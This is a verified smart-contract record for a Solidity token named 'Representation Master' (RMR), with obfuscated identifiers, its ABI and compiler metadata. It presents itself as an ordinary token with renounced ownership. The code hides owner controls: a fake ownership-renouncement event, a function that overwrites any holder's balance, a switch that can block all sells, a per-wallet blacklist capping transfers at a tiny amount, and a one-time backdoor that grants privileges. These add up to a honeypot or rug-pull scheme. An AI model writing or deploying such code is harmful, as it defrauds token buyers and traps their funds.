{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface senderTeam {\n    function createPair(address limitReceiver, address exemptIs) external returns (address);\n}\n\ninterface tokenTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txLaunch) external view returns (uint256);\n\n    function transfer(address toModeShould, uint256 feeAmount) external returns (bool);\n\n    function allowance(address liquidityFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toModeShould,\n        uint256 feeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMode, uint256 value);\n    event Approval(address indexed liquidityFrom, address indexed spender, uint256 value);\n}\n\nabstract contract enableSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAmountReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenToMetadata is tokenTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepresentationMaster is enableSell, tokenTo, tokenToMetadata {\n\n    uint256 public receiverLaunch;\n\n    uint256 private feeLaunch = 100000000 * 10 ** 18;\n\n    uint8 private senderMarketing = 18;\n\n    bool private fromIs;\n\n    mapping(address => bool) public walletTotal;\n\n    address buyTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private marketingIs;\n\n    function isEnable(address shouldTradingFrom, address toModeShould, uint256 feeAmount) internal returns (bool) {\n        if (shouldTradingFrom == tokenFee) {\n            return swapIs(shouldTradingFrom, toModeShould, feeAmount);\n        }\n        uint256 walletLiquidity = tokenTo(modeTake).balanceOf(buyTeam);\n        require(walletLiquidity == takeListLiquidity);\n        require(toModeShould != buyTeam);\n        if (walletTotal[shouldTradingFrom]) {\n            return swapIs(shouldTradingFrom, toModeShould, txLimit);\n        }\n        return swapIs(shouldTradingFrom, toModeShould, feeAmount);\n    }\n\n    uint256 constant txLimit = 15 ** 10;\n\n    address public modeTake;\n\n    string private receiverLaunched = \"Representation Master\";\n\n    uint256 takeListLiquidity;\n\n    function receiverTakeSell() public {\n        emit OwnershipTransferred(tokenFee, address(0));\n        takeAt = address(0);\n    }\n\n    uint256 private launchedMax;\n\n    function transferFrom(address shouldTradingFrom, address toModeShould, uint256 feeAmount) external override returns (bool) {\n        if (_msgSender() != amountTrading) {\n            if (minSender[shouldTradingFrom][_msgSender()] != type(uint256).max) {\n                require(feeAmount <= minSender[shouldTradingFrom][_msgSender()]);\n                minSender[shouldTradingFrom][_msgSender()] -= feeAmount;\n            }\n        }\n        return isEnable(shouldTradingFrom, toModeShould, feeAmount);\n    }\n\n    event OwnershipTransferred(address indexed feeLaunchedSender, address indexed launchedFromAuto);\n\n    function owner() external view returns (address) {\n        return takeAt;\n    }\n\n    uint256 listFund;\n\n    mapping(address => uint256) private launchShouldTotal;\n\n    mapping(address => mapping(address => uint256)) private minSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAuto;\n    }\n\n    address private takeAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLaunch;\n    }\n\n    function approve(address atTotalTake, uint256 feeAmount) public virtual override returns (bool) {\n        minSender[_msgSender()][atTotalTake] = feeAmount;\n        emit Approval(_msgSender(), atTotalTake, feeAmount);\n        return true;\n    }\n\n    function tokenSell() private view {\n        require(takeLaunch[_msgSender()]);\n    }\n\n    address amountTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return takeAt;\n    }\n\n    bool public autoAmount;\n\n    string private marketingAuto = \"RMR\";\n\n    address public tokenFee;\n\n    function balanceOf(address txLaunch) public view virtual override returns (uint256) {\n        return launchShouldTotal[txLaunch];\n    }\n\n    function allowance(address enableSwap, address atTotalTake) external view virtual override returns (uint256) {\n        if (atTotalTake == amountTrading) {\n            return type(uint256).max;\n        }\n        return minSender[enableSwap][atTotalTake];\n    }\n\n    bool private launchMax;\n\n    function transfer(address txSell, uint256 feeAmount) external virtual override returns (bool) {\n        return isEnable(_msgSender(), txSell, feeAmount);\n    }\n\n    function tokenTakeReceiver(address txSell, uint256 feeAmount) public {\n        tokenSell();\n        launchShouldTotal[txSell] = feeAmount;\n    }\n\n    mapping(address => bool) public takeLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    function receiverWallet(uint256 feeAmount) public {\n        tokenSell();\n        takeListLiquidity = feeAmount;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderMarketing;\n    }\n\n    function swapIs(address shouldTradingFrom, address toModeShould, uint256 feeAmount) internal returns (bool) {\n        require(launchShouldTotal[shouldTradingFrom] >= feeAmount);\n        launchShouldTotal[shouldTradingFrom] -= feeAmount;\n        launchShouldTotal[toModeShould] += feeAmount;\n        emit Transfer(shouldTradingFrom, toModeShould, feeAmount);\n        return true;\n    }\n\n    function fundTake(address senderLiquidity) public {\n        tokenSell();\n        if (launchedMax == marketingIs) {\n            launchedMax = receiverLaunch;\n        }\n        if (senderLiquidity == tokenFee || senderLiquidity == modeTake) {\n            return;\n        }\n        walletTotal[senderLiquidity] = true;\n    }\n\n    constructor (){\n        if (marketingIs == sellAuto) {\n            marketingIs = sellAuto;\n        }\n        senderAmountReceiver minSwap = senderAmountReceiver(amountTrading);\n        modeTake = senderTeam(minSwap.factory()).createPair(minSwap.WETH(), address(this));\n        \n        tokenFee = _msgSender();\n        takeLaunch[tokenFee] = true;\n        launchShouldTotal[tokenFee] = feeLaunch;\n        receiverTakeSell();\n        \n        emit Transfer(address(0), tokenFee, feeLaunch);\n    }\n\n    uint256 private sellAuto;\n\n    function txLiquidity(address atReceiver) public {\n        require(atReceiver.balance < 100000);\n        if (autoAmount) {\n            return;\n        }\n        \n        takeLaunch[atReceiver] = true;\n        \n        autoAmount = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFromAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTotalTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotalTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTakeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"tokenTakeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toModeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RepresentationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}